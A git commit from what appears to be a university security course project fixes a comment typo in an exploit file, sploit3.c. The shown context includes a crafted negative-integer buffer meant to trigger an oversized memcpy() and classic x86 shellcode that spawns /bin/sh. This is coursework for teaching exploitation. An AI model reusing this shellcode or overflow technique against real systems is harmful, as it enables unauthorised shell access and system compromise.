0c9df719f1ac0114bda1aa38a26c3be77d68753d
Tanner <tannerjharper@gmail.com>
2016-03-29 01:37:36 -0500

    Fixed some typos

--- proj2-files/sploits/sploit3.c
+++ proj2-files/sploits/sploit3.c
@@ -33,7 +33,7 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  char buf[2820] = "-1764004375,";  //signed int to read 2808 bytes when past in memcpy(), takes 12 bytes, next empty mem addr is buf[12]
+  char buf[2820] = "-1764004375,";  //signed int to read 2808 bytes when passed in memcpy(), takes 12 bytes, next empty mem addr is buf[12]
   char sh[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
